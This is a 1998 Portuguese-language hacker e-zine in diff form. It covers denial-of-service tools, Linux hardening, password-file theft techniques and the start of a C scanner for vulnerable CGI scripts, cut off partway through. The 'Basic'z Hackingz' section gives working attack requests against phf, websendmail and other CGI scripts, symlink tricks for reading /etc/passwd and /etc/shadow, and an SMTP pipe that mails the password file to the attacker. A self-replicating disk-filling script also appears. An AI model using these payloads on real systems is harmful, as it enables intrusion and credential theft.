@@ -1,0 +1,3783 @@
+                  T     H     E
+
+         $Pø"ý$b   ,gPø"ýb  ,gPø"ýb  ,gPø$$$$$$$ý$b  $     $
+         $     $  $      $  $     $         $        $     $
+         $     $  $         $     $         $        $     $
+         $     $  $         $     $         $        $,   ,$
+         $     $  gPý""'    $$$$$$$         $        $$$$$$$
+         $     $  $         $     $         $        $'   `$
+         $     $  $      $  $     $         $        $     $
+         $     $  $      $  $     $        .$.       $     $
+         $,   g'  $,    g'  $     $        $$$       $     $
+         $Pýýø"    øýýýø"   ý     ý        $$$       ý     ý
+            $   $
+            $  $
+            $ $
+            $$            ø
+            $$     $$  $  $  ,g$$$   $  $  $$$$$  .$$$$$
+            $ $    $ $ $  $  $       $  $    $    $$
+            $  $   $  $$  $  $  `"$  $$$$    $    `""'$.
+            $   $  $   $  $  `d$$b'  $  $    $        $$
+            $$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$P'
+
+ ______________________________Death_Knights_________________________________
+ ----------------------------------------------------------------------------
+
+                        Data estelar:  1.0875144298
+                        Data terrestre:  21/12/1998
+
+DeathKnights #07b
+
+e-mail: death@DeathKnights.com
+
+page: http://www.DeathKnights.com
+
+     melhor visualizado com joe -asis e terminal com setfont alt-8x16. (linux)
+                           melhor visualizado com edit.                (dos)
+
+ ______________________________Death_Knights_________________________________
+ ----------------------------------------------------------------------------
+
+.-----------.
+|   SECOES   \_______________________________________________________________
+`----------------------------------------------------------------------------'
+
+1  * ESCLARECIMENTOS                        Cacaio
+2  * Ataques de Denial of Service           Cacaio
+3  * NET Security                           CoOLaPsE (colaborador)
+4  * Basic'z  Hackingz                      Cheat Struck
+5  * Checador de scripts cgi                Cacaio
+6  * Backdoors                              Cheat Struck
+7  * iParty                                 Cacaio
+8  * Simples gerador de wordlists           Cacaio
+9  * Deteccao de Ataques em Sistemas
+     Distribuidos                           REBOOT
+10 * l0gs.......                            Cacaio
+11 * Phreaking Celulares Motorola           Cheat Struck
+12 * Introducao ao AS/400                   Cacaio
+13 * Vulnerabilidade do Sendmail            Cacaio
+14 * Web Sniffer                            Cacaio
+--
+15 * Few Words                              Cacaio
+
+-=[  1  ]=-
+.----------------.
+| ESCLARECiMENTOS \__________________________________________________________
+`----------------------------------------------------------------------------'
+
+        Por que numero 07b? Por que na 07a faltavam as imagens da materia do
+REBOOT.
+
+        Nao nos responsabilizamos pela informacao contida neste zine. Se voce
+usar indevidamente qualquer informacao contida aqui, a responsabilidade e' to-
+da sua. Se for pego, preso ou sei la o que, nao nos perturbe.
+
+        Esta zine estava otima, mais de 150k de pruo texto e codigos fontes,
+mas deu um pau no meu hd e perdi grande parte disto. O que eu recuperei juntei
+e fiz este zine de fundo de quintal, por que estaria muito melhor se eu nao
+tivesse perdido os dados, mas.. sei la.. to com muita raiva e nao vou falar
+muita coisa.
+
+        Este grupo nao visa nenhum fim lucrativo. Nos fazemos isto por diver-
+sao e nada mais. Se voce ainda assim achar que temos algum fin lucrativo,
+diga aonde voce viu isso, e lhe provarei o contrario.
+
+        Se voce nao gostou da informacao contida aqui, nao nos perturbe. O
+problema e' todo seu.
+
+-=[  2  ]=-
+.-----------------------------.
+| Ataques de Denial of Service \_____________________________________________
+`----------------------------------------------------------------------------'
+                              by Cacaio
+
+Os ataques de Denial of Service (DoS) sao muito usados por que eles podem
+temporariamente deixar uma maquina desligada ou travada, e dependendo de
+qual maquina, ate sua rede inteira.
+
+O primeiro DoS de alguma significacao foi o Morris Worm. Foi estimado que
+algumas das 5000 maquinas afetadas por este worm ficaram fora por varias
+horas. Na epoca (novembro de 1988), isto foi um grande desastre para varias
+instituicoes, como centros de pesquisas e universidades, mas nao teve tanto
+impacto para o resto do mundo. Hoje em dia, um DoS pode resultar em milhoes
+perdidos.
+
+Observacao: O Morris Worm nao foi feito com a intencao de causar DoS's, mas
+sim propagar a si mesmo.
+
+O objetivo de quem quer fazer um DoS quer e' simples e direto: tirar host(s)
+da rede. Exceto quando sao usados em testes em suas proprias maquinas, os
+DoS's sao sempre nocivos. Nos Estados Unidos e na Franca, causar DoS em algum
+lugar e' um crime.
+
+Onde voce vai encontrar ataques de DoS
+
+Os ataques de DoS batem diretamente nas implementacoes do IP. Podem ser feitos
+para funcionarem em diversas plataformas. Se o DoS utilizado ainda nao tiver
+patch, ou o patch demorar para ser lancado (caso da micro$oft), ele sera muito
+usado e na grande maioria das vezes tera' o efeito desejado, salvo quando os
+patches sao particulares e nao oficiais.
+
+Os programas que causam DoS's normalmente sao escritos para uma plataforma A
+(Linux por exemplo) atacar a plataforma B(Windoze95 por exemplo). E quando o
+codigo e' lancado, geralmente ele e' melhorado por algum(ns) coders e em
+alguns dias um codigo novo e' lancado.
+
+No meu ponto de vista, os programas que causam DoS so' tem um lado negativo:
+normalmente sao usados por pessoas que nao tem ideia do que fazer com eles, e
+os usam com "amigos". Este e' o problema: qualquer um pode pegalo e usa-lo.
+
+Alguns DoS's conhecidos:
+
+                Bonk e Boink
+
+        Arquivo: bonk.c e boink.c
+        Autor: o pessoal da rootshell.com
+        Onde encontrar: http://www.njh.com/latest/9801/980109-01.html
+        Sistema para compilacao: UNIX e sabores
+        OS's alvo: Windows 95 e NT
+        O que faz: trava ou deixa a tela azul, dependendo da maquina. Este co-
+digo e' somente uma mudanca de um codigo escrito anteriormente por
+route@infonexus.com.
+        Fix: http://itrac.bourg/net/patches/nt/tearfixi.exe
+
+                Hanson
+
+        Arquivo: hanson.c
+        Autor: Myn@efnet
+        Onde encontrar: http://www.netlife.fi/users/zombi/hanson.c
+        Sistema para compilacao: UNIX e sabores
+        OS's alvo: Windows qualquer que esteja usando mIRC ate 5.3
+        O que faz: Trava o mIRC obrigando o usuario a fecha-lo.
+        Fix: Desligar o identd do mIRC ou pegar versao atualizada.
+
+                Inetinfo
+
+        Arquivo: inetinfo
+        Autores: Bob Beck, Chris Bayly e Evan L. Carew
+        Onde pegar: http://www.jabukie.com/Unix_Sourcez/inetinfo
+        Sistema para compilacao: UNIX e outros
+        OS's alvo: Windows NT 4.0
+        O que faz: Manda strings de texto nas portas 135 e 1031 que killam o
+IIS.
+        Fix: Service Pack 2.0
+
+                Jolt
+
+        Arquivo: jolt.c
+        Autor: Jeff W. Roberson
+        Onde pegar: http://www.jabukie.com/Unix_Sourcez/jolt.c
+        Sistema para compilacao: UNIX e sabores
+        OS's alvo: Windows 95
+        O que faz: manda pacotes muito grandes fragmentados q travam a maquina
+        Fix: http://support.microsoft.com/download/support/mslfiles/Vipup20.exe,
+mas este patch so funciona se voce tambem instalar o VTCPUPD tambem, que pode
+ser obtido em http://support.microsoft.com/download/support/mslfiles/Vtcpupd.exe.
+
+                Land
+
+        Arquivo: land.c
+        Autor: o pessoal da rootshell.com
+        Onde pegar: http://www.jabukie.com/Unix_Sourcez/land.c
+        Sistema para compilacao: UNIX e sabores
+        OS's alvo: grande maioria dos OS's
+
+                Newtear
+
+        Arquivo: newtear.c
+        Autor: route@infonexus.com (Michael Schiffman)
+        Onde pegar: http://itrac.bourg.net/exploit/newtear.c
+        Sistema para compilacao: Linux, BSD
+        OS's alvo: Windows 95 e NT
+        O que faz: trava a maquina. nao e' mais nada do que uma variacao do
+teardrop.
+        Fix: http://itrac.bourg.net/patches/nt.tearfixi.exe
+        Advisory da Microsoft: ftp://ftp.microsoft.com/bussys/winnt/
+winnt-public/fixes/usa/nt40/hotfixes-postSP3/teardrop2-fix/Q179129.txt
+
+                Pong
+
+        Arquivo: pong.c
+        Autor: FA-Q
+        Onde pegar: http://www.ludat.lth.se/~dat92jni/dat/pong/pong.c
+        Sistema para compilacao: Linux
+        OS's alvo: Windows 95
+        O que faz: faz um flood na maquina, spoofando, ate que a maquina caia.
+        Fix: desconhecido (por mim)
+
+                Puke
+
+        Arquivo: puke.c
+        Autor: Jeff W. Roberson
+        Onde pegar: http://www.jabukie.com/Unix_Sourcez/puke.c
+        Sistema para compilacao: UNIX e sabores
+        OS's alvo: Windows 95, Linux e outros
+        O que faz: Manda pacotes os quais o endereco source e' unreachble
+(inalcancavel), a maquina tenta acessar o endereco e trava.
+        Fix: para linux, kernel 2.0.36, para outros OSs, desconhecido(por mim)
+
+                Real Audio Attack
+
+        Arquivo: pnserver.c
+        Autor: o pessoal da rootshell.com
+        Onde pegar: http://itrac.bourg.net/exploits/pnserver.c
+        Sistema para compilacao: UNIX e sabores
+        OS's alvo: qualquer um que esteja rodando um servidor de real audio
+        O que faz: trava o server, fazendo com que voce tenha que roda-lo
+novamente.
+        Fix: nao procurei... que tal http://www.real.com?
+
+                Solaris Telnet Attack
+
+        Arquivo: solaris_telnet.c
+        Autor: desconhecido
+        Onde pegar:http://www.seciety-of-shadows.com/security/solaris_telnet.c
+        Sistema para compilacao: UNIX e sabores
+        OS's alvo: Solaris 2.5
+        O que faz: faz com que o sistema alvo nao aceite mais telnet's
+        Fix: desconhecido
+
+                Teardrop
+
+        Arquivo: teardrop.c
+        Autor: route@infonexus.com
+        Onde pegar: http://qqq.rat.pp.se/hotel/panik/archive/teardrop.c
+        Sistema para compilacao: UNIX e sabores
+        OS's alvo: Windows 95 e NT e alguns Linuxes
+        O que faz: ataque de ip fragmentado que trava ou reinicia o alvo
+        Fix: para linux, atualizar kernel. para windows,
+ftp://ftp.microsoft.com/bussys/winnt/winnt-public/fixes/usa/nt40/
+hotfixes-postSP3/simptcp-fix, http://itrac.bourg/net/patches/nt/tearfixi.exe
+
+                Bug do Pentium
+
+        Arquivo: pentium_bug.c
+        Autor: Whiz (whizpig@tir.com)
+        Onde pegar: http://www.jabukie.com/Unix_Sourcez/pentium_bug.c
+        Sistema para compilacao: qualquer um desde que o processador seja pentium
+        OS's alvo: qualquer um desde que o processador seja pentium
+        O que faz: Trava o alvo
+        Fix: http://support.intel.com/support/processors/pentium/ppiie/
+descrip.htm#Workaround
+
+                Winnuke
+
+        Arquivo: winnuke.c
+        Autor: _eci
+        Onde pegar: http://www.skyinternet.com/~llo/windoze/winnuke/winnuke.c
+        Sistema para compilacao: Linux, BSDI
+        OS's alvo: Windows 95 e NT
+        O que faz: causa um erro na maquina obrigando a resetar
+        Fix:http://support.microsoft.com/download/support/mslfiles/Vipup20.exe
+
+                DNSKiller
+
+Ele simplesmente trava qualquer NT 4.0 que seja um DNS Server. Mais informacoes
+em http://www.otol.fi/~jukkao/bugtraq/before-971202/0015.html
+
+                arnudp100.c
+
+        Este programa cria falsos pacotes udp e pode ser usado para implementar
+ataques de DoS em portas UDP como a 7, 13, 19 e 37. Para entender o que ele faz
+e' bom dar uma lida em http://cio.cisco.com/warp/public/707/3.html e em
+ftp://ftp.certo.org/pub/cert_advisories/CA-96.01.UDP_service_denial . Este
+tipo de ataque foi feito em 1995, mas agora como muitas pessoas se esqueceram
+dele ele esta voltando a ser usado, sendo eficaz em muitas das vezes.
+
+                                                     Fonte: Maximum Security
+E' so isso mesmo... =P                                      Anonymous,
+                                                            ISBN 0-672-31341-3
+
+-=[  3  ]=-
+.-------------------.
+|    NET SEcurity    \_______________________________________________________
+`----------------------------------------------------------------------------'
+                              by CoOLaPsE
+
+Bem... vou escrever algumas coisas sobre NET Security, pra galera pegar mais
+coisa.. (C vc axa q vc eh fodao, nem le)
+Vou comecar com o basico e tal, mais nao vou escrever para lamers, portanto
+c alguma coisa pegar, NET-3-HOWTO, Ethernet HOWTO, Firewall HOWTO e outros
+jah conhecidos..
+
+0. Intro.
+
+Well, vou escrever sobre Linux, que na minha opiniao eh o SO mais bem feito,
+e com maior performance do mundo.
+O grnd lance do Linux eh que, na mao de um bom admin, eh r0x, mais c pegar 1
+admin bundinha, vai ficar 1 merda, pois ele realmente faz oq VC ker q ele
+faca.
+Vou escrever aki principalmente para IntraNETz com links a InterNET,
+q sao os alvos mais visados, e pra kem mais kiser ler essa merda. :D
+Chegando com a falacao de putaria, vamos ao q interessa.
+
+1. Comecando com o basico.
+
+Vc vai comecar a contruir sua rede e tal, precisa pegar 1 nocao basica.
+Sua rede tem 1 servidor (espero), e digamos, 10 maquinas e um ou dois HUBs
+(tbm espero. C nao tiver, comeca a pensar em comprar, HUBs estao baratinhos).
+Construa sua IntraNET baseado no eskema de rede tipo Star. Dai vc pergunta:
+pq papai? R: Pq na rede tipo Star, fica bem mais foda de kebrar a IntraNET em
+2, oq acontece facilmente nas ponto a ponto. Dai novamente vc pergunta: oq
+isso tem a ver com security papai? R: Sei lah, mais eu axo q eh 1 estrutura
+mais solida e confiavel doq a ponto-a-ponto, faca como kiser!
+Vamos a um diagrama light pra vc ententder o lance.
+
+Diagrama:
+
+             (Star)                    (Pnto-a-Pnto)
+
+       A     SERVER    B           A--B--C--D-----Embratel
+       |        |      |
+       |        |      |
+       |-------HUB------
+              / |  \
+             |  |   |
+             C  |   D
+                |
+                |
+  --------------------------------
+  /////////// Embratel ///////////
+  --------------------------------
+
+Se vc perguntar qual a diferenca, vou te mandar tomah no cuh.
+Saca q, na rede tipo Star, vc vai usar cabos 10baseT com conectores RJ45,
+jah na Pnto-a-Pnto, vai usar os 10base2 ou 10base5 (10base5 eh 1 verdadeiro
+cuh.. caro, pouco flexivel e tal, parece 1 cabo de aco).
+Vamos a um diagrama q mais parece 1 suruba.. heheheh :D
+
+Obs: 10base2                    10baseT                 10base5
+      | |  |                     |  | |                  |  | |
+      | |  --------             DUH-- |           DUH--- | -- |
+      | -------   |                   --Twisted               |
+      |       |  (Maximo segmento de 200m)       (Maximo sgmto de 500m)
+   (10mbps)  (Rede em banda base)
+
+Normalmente, para redes tipo Star, usa-se cabos UTP (Unshielded Twisted
+Pair), q logicamente nao eh blindado, q tem menos imunidade a ruido (DUH)
+mais nao faz mta diferenca em ambientes normais.
+Provavelmente vc estah usando 1 rede do tipo 802.3 (Ethernet). Vamos a mais
+algumas especificacoes (quem axa q jah manja, pula essa parte).
+Nao vou falar do 10base5 pq eh tao raro e caro q nao compensa.
+O 10base2 ou thinnet (pq eh mais fininho q o 10base5) trabalha em segmentos
+maximos de 200m, com no maximo 30 maquinas por segmento. C vc tiver mais de
+30 maquinas, tem que usar repetidores, pra aumentar a capacidade da rede. Ele
+usa conectores BNC, e precisam ser terminados com resistorezinhos na ponta
+do ultimo T vazio, c nao nao funca.
+O UTP vem em 5 graus, nivel 1 a 5, e qnt maior o nivel melhor (e + $$,
+EhEhHE), portanto, c tiver $$ sobrando, compre UTP's nivel 5 e me de 1
+pouco do $$. :D
+Agora vc jah pegou 1 nocao basica de como funciona a parte fisica de rede,
+vamos a luta. :)
+
+2. O Servidor
+
+2.1. Kernel Cfg
+
+Olha, vc deve baixar a ultima versao do kernel (para ver isso faca: finger
+@linux.kernel.org)
+Hoje (10/11/98), a ultima versao estavel eh a 2.0.35, e eu aconselho vc a
+usar a versao estavel a nao ser q saiba oq esta fazendo.
+Antes de compilar, faca o seguinte:
+Na parte de Networking Options:
+
+Ative o Drop source routed frames
+Ative o Syn cookies
+Ative o Network Firewalls
+Ative o TCP/IP Networking
+Ative o IP Firewalling
+Ative o IP Firewall Packet loggin.
+Ative tbm as Disk Quotas.
+
+Obs: Com o IP Firewalling, vc pode se utilizar do programa ipfwadm para
+criar regras de controle de trafego. Voce pode por exemplo rejeitar todos os
+pacotes ICMP do host untrusted.org ou aceitar todos do host trusted.com.br
+Quando o sistema eh bootado, as cfgs sao perdidas, portanto, crie as regras
+dentro do file /etc/rd.d/rc.local (no Slackware) para que sejam recriadas
+sempre que a maquina eh bootada.
+
+2.2. Cfg dos servicos.
+
+Suponho q vc jah tenha o Linux instalado no server (Slackware, pleaase),
+portando nao vou ensinar a instalar nada, pq isso eh basico d+ pra escrever
+aki.
+Vamos comecar desabilitando servicos inuteis, direto no /etc/inetd.conf
+Aconselho deixar habilitado apenas telnet, ftp, http, SMTP, POP3 e
+domain.
+Edite o arquivo /etc/hosts.deny e acrescente a linha:
+in.telnetd: ALL
+Edite o /etc/hosts.allow e acrescente ponha as makinas q poderao acessar
+telnet (o minimo possivel de makinas), no formato:
+in.telnetd: IP
+Ex.: in.telnetd: 205.34.67.8
+     in.telnetd: 200.231.45. (tdas as makinas com essa network portion,
+desde a 200.231.45.1 a 200.231.45.255)
+A ordem de checagem eh primeiro o hosts.allow, c tiver liberado lah, entra,
+c nao tiver nada lah, checa o deny pra ver c tem algum impedimento, c nao
+tiver, entra, c tiver, rejeita (Ohh!)
+Normalmente o pessoal de dentro da IntraNET eh O.K, portando, fica ao seu
+criterio liberar ou nao liberar.
+Um artificio interessante em relacao a telnet, eh snoopea-la, oq vai
+permitir ver em tempo real oq o cara tah fazendo, e outra, eh restringir o
+acesso do usuario ao seu home-dir, oq dificulta qquer tentativa de exploitar
+a maquina. Pra quem nao sabe fazer essa restricao, eh soh acrescentar a
+linha:
+PATH="$PATH:$HOME:./"
+no arquivo .profile dentro do homedir do cara, e logicamente, retirar o
+acesso a gravacao do arquivo: chmod a-r .profile (dentro do dir do carinha).
+
+2.3. Alterando alguns detalhes.
+
+Edite o arquivo /etc/login.defs e altere o seguinte:
+
+FAIL_DELAY            8
+QUOTAS_ENAB           yes
+MD5_CRYPT_ENAB        yes
+
+Esse lance do MD5 eh legal pois vai mudar o sistema de criptografia padrao
+(DES) pra MD5, oq vai dificultar pras kiddies crackearem.
+Isso deve ser antes de cadastrar qquer usario (- o root, DUH), e depois
+dessa alteracao, a senha do root deve ser mudada (pode ser pra mesma coisa),
+para q ela seja criptografada com a MD5.
+A disk quota, eh pra evitar q kiddies escrotos tentem phoder com seu HD,
+lotando ele de merda, com scriptizins bundinhas do tipo:
+
+-------- kiddie.sh START ------------
+#!/bin/bash
+cd
+mkdir ./fuck
+cd ./fuck
+cp ../kiddie.sh ./kiddie.sh
+./kiddie.sh
+
+#SDFJKSDKLFJSDKLFJDSKLFJSDKLFJSDKLFJSDLFKJSDLKFJ (repete essa merda umas
+10.000x)
+--------- kiddie.sh END ---------------
+
+Sacou essa merda? Ateh vc apagar esse lixo, ele vai atrapalhar o
+funcionamento do server, e jah c tiver Disk Quota, isso nao vai rolar, pq
+ele nao vai deixar o babaca ultrapassar 1 certo limite de uso no HD.
+Na minha opiniao, 3MB na media pra kda user eh mais doq suficiente.
+Obs: C nao sabe usar o Disk Quota -> man ulimit (Tem q ativar no
+kernel. DUH)
+
+3. Firewalls
+
+Mta gente tem o conceito errado sobre oq eh 1 firewall.
+Entao, vamos comecar.
+Existem 2 tipos de FW's, as filtering FW's e as Proxy FW's.
+Na minha modesta opniao, as filtering FW's sao suficientes pra qse td mundo,
+e sao mais faceis de implementar, nao sendo necessario o uso de proxyes e
+etc.
+Vamos explicar o basico com 1 diagrama light pro pessoal (os IP's nao
+precisam ser esses. DUH):
+
+                   200.240.25.1    192.168.2.1
+ --------------          \            /       ---------------
+ |            |           \----------/        |             |
+ |  INTERNET  |------------| FW Sys |---------|  IntraNET   |
+ |            |            ----------         |             |
+ --------------                               ---------------
+
+Deu pra pegar? a FW acessa as duas networks, portanto tem 2 ifaces, 1 pra
+fora e 1 pra dentro. A Network Portion (os 3 primeiros numeros do IP) pode
+ser qquer IP, e a gateway padrao deles deve ser o IP da iface interna da
+firewall (que acessa a IntraNET).
+Portanto, como vc jah deve ter notado, todo o fluxo IntraNET - InterNET
+passa pela firewall, portanto vc pode controlar oq entra na IntraNET e oq
+sai da IntraNET.
+Rode o minimo de daemons na FW (cuidado especial com o BIND, POP3, SendMail
+e as versoes do IMAP), um  telnet daemon pra controla-la de longe
+seria uma boa. Lembre-se, c alguem entrar na FW, acabou todo o eskema!
+Provavelmente vc vai querer rodar o servico de masquerading na FW, pra pegar
+os IP's 192.168.2.* e botar o IP certo q pode passear na InterNET :)
+Entao tudo vai rolar normalmente, mais vai dificultar a vida das kiddies..
+EhEhEHE :D
+Obs: Leia o Firewalling HOWTO
+
+3.1. Detalhes na firewall
+
+Nao vou falar mto aki por que tem o Firewalling HOWTO, mais 1 coisa
+interessante na FW eh usar a MD5 como criptografia padrao, ter 1 copia
+segura do ifconfig, netstat, ps, ls, passwd e pstree dentro de um diskinho
+1.44 montado em algum dir do HD, protegido contra escrita fisicamente
+(pininho do disco). Se quiser ter 1 copia do Neped (mto bom), tbm eh 1
+otima.
+Outra coisa interessante eh rodar o TripWire na FW, e nao soh nela como em
+qquer makina critica. Oq essa gracinha faz? Cria 1 banco de dados com o
+checksum dos arquivos que vc quiser, e dai vc pode fazer ele dar 1 checada
+em 1 certo intervalo de tempo e mandar os resultados pro seu e-mail (usando
+o crontab)... mais dificuldades pras kiddies.. HOHoHohOhOH.
+Um detalhe eh ter 2 drives 1.44 na FW, 1 com os prgs q citei acima e outro
+com o banco de dados do Trip (faz 1x soh), tbm montado e protegido contra
+escrita fisicamente. Isso evita q os hackers-wanna-be rooteiem vc (dificil),
+instalem trojans e recriem outra database com os checksums atualizados dos
+arquivos trojaneados.
+Se der, fica interessante manter uma copia do proprio Trip no disco, pra
+evitar q o seu codigo fonte seja modificado e recompilado pra esconder
+alguma modificacao especifica (trojans, backdoors, etc).
+
+4. Programas SUID/SGID
+
+Olha, o unico jeito de conseguir privilegios em um sistema Linux eh
+explorando falhas em programas que tem privilegios setados.
+Oq acontece eh q alguns programas precisam de privilegios pra poder
+funcionar, e na instalacao, esses privilegios sao dados automaticamente.
+O lance eh q, teoricamente, esses programas deviam ser imunes a qquer tipo
+de falhas, o que nao acontece na pratica. Portanto, nada nos impede de
+retirar esse SUID Bit de alguns programas, para que mesmo que ele tenha
+alguma especie de falha, nao seja possivel executar comandos com privilegios
+atraves dele, usando buffer overflows e afins.
+Como faco isso papai?
+Primeiro os encontre: find / -type f \( -perm -04000 -o -perm -02000 \)
+Isso vai te dar uma listagem dos programas SUID/SGID.
+Agora, para retirar, mande 1 chmod a-s PRG. Nao sai tirando que nem louco,
+tira soh dos que nao sao confiaveis, pouco usados ou q nao sao necessarios.
+
+5. SSH
+
+Eh um tanto importante usar SSH (Secure Shell) entre conexoes criticas, como
+da IntraNET para a FW, da FW pro Server da IntraNET, da InterNET para a FW e
+etc.
+A SSH vai criptografar sua secao e evitar sniffing, session hiijacking e
+tal, oq vai dificultar ainda mais a vida das kiddies (sempre dificultando..
+EhEhHeE).
+Para voce conectar usando SSH, vc vai precisar do stelnet.
+Obs: A SSH usa o eskema de public e private key pra critografar os dados da
+secao.
+HP da SSH: http://www.cs.hut.fi/ssh
+
+6. Detalhes lights
+
+No servidor e na FW, entra na BIOS e no boot sequence coloca C,A. Tbm poe 1
+passwd na BIOS, com o detalhe dq o passwd seja requerido apenas pra entrar
+no Setup da BIOS, e nao no sistema.
+Faca com q o LILO entre automaticamente (retirar a opcao prompt em
+/etc/lilo.conf) paraq em caso de pik de luz, tudo volte numa boa e ainda
+assim dificulte 1 tentativa de invasao local.
+Outra coisa eh adicionar os dois discos no /etc/fstab paraq eles sejam
+montados automaticamente no boot-time.
+
+6.1. Detalhe importante
+
+C depois de fazer tudo isso voce colocar na sua makina l: root, p: root ou
+qquer outra dessas merdas, vc eh 1 otario.
+Procure usar uma senha de uns 15 caracteres, com letras numeros e caracteres
+especiais. (Pra foder com a vida dos dicionary attacks)
+
+        CoOLaPsE
+        `'`'`'`'
+
+-=[  4  ]=-
+.--------------------.
+|  Basic'z  Hackingz  \______________________________________________________
+`----------------------------------------------------------------------------'
+                             by Cheat Struck
+
+	Vou colocar aqui diversos meios que devem ser considerados no minimo
+basicos de se pegar o arquivo de senhas. Vou colocar aqui os passos que eu
+sigo. Caso voce nao esteja afim de seguir os meus passos o problema e' teu.
+
+	A primeira coisa a se fazer e' procurar por cgi-bin's na porta 80 do
+servidor. Para isso eu uso o  telnet ao invez do meu browser.
+
+	Ae vai uma lista dos comandos que uso frequentemente para verificar..
+
+_____________________________________________________________________________
+GET /cgi-bin/phf?Qalias=x%0acat%20/etc/passwd           # phf
+GET /cgi-bin/php.cgi?/etc/passwd                        # php.cgi
+GET /cgi-bin/test-cgi?/etc/*                            # test-cgi
+GET /cgi-bin/query?%0a/bin/cat%20/etc/passwd            # query
+GET /cgi-bin/faxsurvey?/bin/cat%20/etc/passwd           # faxsurvey
+GET /cgi-bin/htmlscript?../../../../etc/passwd          # htmlscript
+GET /cgi-bin/webdist.cgi?distloc=;cat%20/etc/passwd     # webdist.cgi
+GET /cgi-bin/nph-test-cgi?/etc/*                        # nph-test-cgi
+GET /cgi-bin/echo?%0Acat%20/etc/passwd                  # echo
+GET /cgi-bin/view-source?../../../../../etc/passwd      # view-source
+GET /cgi-bin/pfdispaly.cgi?/../../../../etc/passwd      # pfdisplay
+GET /cgi-bin/campas?%0acat%0a/etc/passwd%0a             # campas
+GET /cgi-bin/wrap?/../../../../../etc                   # wrap
+GET /cgi-bin/handler/whatever;cat /etc/passwd|? data=Download
+                                                        # whatever
+GET /cgi-bin/handler/xenolith;cat  /etc/passwd/|   ?data=Download
+                                                        # xenolith
+POST /cgi-bin/websendmail HTTP/1.0
+receiver=;mail+SEU@EMAIL.COM.BR</etc/passwd;&sender=a&rtnaddr=a&subject=a&content=a
+                                                        # websendmail
+_____________________________________________________________________________
+
+	Como podem ver, eu aumentei pra caramba essa lista de cgi's. Porem
+existem uns (como por exemplo o whatever) que existem apenas em determinados
+sistemas (no caso IRIX).
+
+	Outro que encontrei em diversos SunOS e Linux foi o query e nao fun-
+cionou a linha de comando mostrada acima. Mas fiquei sabendo de casos em que
+funcionara entao tah ai na lista.
+
+	Se depois de tudo isso ainda nao conseguir o arquivo de senhas (note
+que as linhas acima procuram pelo /etc/passwd e devem ser mudadas caso o host
+esteja com o passwd shadowed) eu tento dar um ftp anonymous.
+
+	Em rarissimos casos eu encontrei o /etc/passwd sem shadow disponivel
+para ftp anonymous. Porem nao e' descartada a possibilidade. Alem disso e'
+sempre bom dar uma olhada no software de ftp.
+
+	Apos isso, passe na rootshell e faça uma busca por bugz neste software
+(To sem saco para descrever todos aqui).
+
+	Tambem veja se existe algum diretorio com permissao de escrita a voce,
+caso tenha voce pode colocar programas que arrombam portas no servidor e um
+.profile ativando-os.
+
+	Por fim... Voce precisara' de uma conta shell. Entao acesse o telnet
+do servidor e lah teste os diversos bugz e exploits que voce pode encontrar
+em todo lugar por ae.
+
+	Nao vou colocar muita coisa aqui.. apenas um basico do que jah e' usado
+frequentemente em diversos servidores do pais e de fora.
+
+_____________________________________________________________________________
+cat /etc/passwd                            # happy lamah
+_____________________________________________________________________________
+cat /etc/shadow                            # me too
+_____________________________________________________________________________
+ypcat passwd                               # get yppasswd
+_____________________________________________________________________________
+pwget                                      # only HP-UX
+_____________________________________________________________________________
+rm -f .lastlogin                           # only SunOS
+ln -s ~/.lastlogin /etc/passwd
+logout
+cat ~/.lastlogin
+_____________________________________________________________________________
+/usr/sbin/lquerypv -h /etc/passwd          # only AIX
+_____________________________________________________________________________
+ln -s /etc/passwd /tmp/dummy.dip           # only Linux
+/sbin/dip -v /tmp/dummy.dip
+_____________________________________________________________________________
+ln -s /etc/passwd .fingerlog               # only Linux again
+finger voce@localhost
+_____________________________________________________________________________
+
+	Por fim.. Se nada der certo, voce pode tentar usar o smtp do servidor.
+Existem diversos bugz que podem ser exploitados. Como eu to me passando muito
+vou colocar aqui apenas um bug para smtpd 5.55 ou 5.57 que e' encontrado em
+versoes desatualizadas do SunOS e AIX.
+
+_____________________________________________________________________________
+mail from: "|/bin/mail seu@email.com < /etc/passwd"
+rcpt to: inexistente
+data
+.
+quit
+_____________________________________________________________________________
+
+	E' isso... Se depois de tudo isso o servidor ainda nao lhe der o file
+de pwds, entao ai da pra começar a testar bugz mais complexos, enviando ex-
+ploits para lah, por ftp e executando-os por telnet.
+
+	Soh escrevi isso porque tem muito begginer que tenta hackear um ser-
+vidor ou provedor de acesso por metodos ultra-complexos emquanto pode-se
+fazer o mesmo com coisas simples como as descritas acima.
+
+        Cheat Struck
+        `'`'`'`'`'`'
+
+-=[  5  ]=-
+.--------------------------.
+|  Checador de scripts cgi  \________________________________________________
+`----------------------------------------------------------------------------'
+                               by Cacaio
+
+Aih, esse checador de cgi e' bem simples, mas util. Ele simplesmente conecta
+no servidor httpd do host designado, e procura por scripts cgi que apresentem
+alguma vulnerabilidade. No total de scripts que este programa procura estao
+19, os quais sao os seguintes:
+
+   .o0o.   phf
+   .oOo.   Count.cgi
+   .o0o.   test-cgi
+   .oOo.   php.cgi
+   .o0o.   handler
+   .oOo.   webgais
+   .o0o.   websendmail
+   .oOo.   webdist.cgi
+   .o0o.   faxsurvey
+   .oOo.   htmlscript
+   .o0o.   pfdisplay
+   .oOo.   perl.exe
+   .o0o.   wwwboard.pl
+   .oOo.   wrap
+   .o0o.   handler
+   .oOo.   info2www
+   .o0o.   campas
+   .oOo.   nph-test-cgi
+   .o0o.   view-source
+
+Quando o programa encontra o cgi, ele avisa com a mensagem "Encontrado!!! ;)".
+Ai' e' so exploitar o cgi. Se nao souber como exploitar, procure informacoes
+por ai', ate' mesmo neste zine, que voce encontra aos montes.
+
+Ai' vai o codigo...
+
+-------xX !!! CuT HeRe !!! !!! CuT HeRe !!! !!! CuT HeRe !!! Xx-------
+#include <fcntl.h>
+#include <sys/types.h>
+#include <sys/socket.h>
+#include <netinet/in.h>
+#include <signal.h>
+#include <stdio.h>
+#include <string.h>
+#include <netdb.h>
+#include <ctype.h>
+#include <arpa/nameser.h>
+#include <sys/stat.h>
+#include <strings.h>
+#include <stdio.h>
+#include <stdlib.h>
+#include <unistd.h>
+#include <sys/socket.h>
+
+void main(int argc, char *argv[])
+{
+ int sock,debugm,pausar,arq=0;
+ struct in_addr addr;
+ struct sockaddr_in sin;
+ struct hostent *he;
+ unsigned long start;
+ unsigned long end;
+ unsigned long counter;
+ char mensagem[] = "200";
+ char *blaetal;
+ char buffer[1024];
+ int count=0;
+ int numin;
+ char bufferdocgi[1024];
